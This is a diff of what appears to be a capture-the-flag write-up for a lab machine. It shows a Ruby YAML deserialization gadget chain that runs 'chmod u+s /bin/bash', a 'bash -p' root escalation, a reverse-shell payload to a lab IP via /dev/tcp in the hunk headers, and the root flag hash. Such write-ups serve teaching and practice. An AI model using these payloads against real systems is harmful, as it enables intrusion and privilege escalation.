@@ -176,7 +176,7 @@ http://10.10.14.12:8000/?name=#{'%20`bash -c 'exec bash -i &>/dev/tcp/10.10.14.1
           method_id: :resolve 
 ```
 
-22. Change the git_set value to `chmod u+s bin/bash`.
+22. Change the git_set value to `chmod u+s /bin/bash`.
 
 ```rb
 ---
@@ -196,7 +196,7 @@ http://10.10.14.12:8000/?name=#{'%20`bash -c 'exec bash -i &>/dev/tcp/10.10.14.1
              sets: !ruby/object:Net::WriteAdapter
                  socket: !ruby/module 'Kernel'
                  method_id: :system
-             git_set: chmod u+s bin/bash
+             git_set: "chmod u+s /bin/bash"
          method_id: :resolve
 ```
 
@@ -212,7 +212,23 @@ http://10.10.14.12:8000/?name=#{'%20`bash -c 'exec bash -i &>/dev/tcp/10.10.14.1
 
 > RESULT
 
-
-
 ![image](https://user-images.githubusercontent.com/70703371/211289639-890b827a-2837-4666-a99c-587d385b5f19.png)
 
+
+26. Now run `bash -p`.
+
+> RESULT - GOT ROOT
+
+![image](https://user-images.githubusercontent.com/70703371/211291113-c2f2e37f-bf5a-4df3-8d7a-62c5dab142c6.png)
+
+
+![image](https://user-images.githubusercontent.com/70703371/211291193-936e3376-89cb-4336-905f-44784a463a7d.png)
+
+
+27. Got the root flag!
+
+## FLAG
+
+```
+dbb4250350277d64ed7effdf09e7b59d
+```
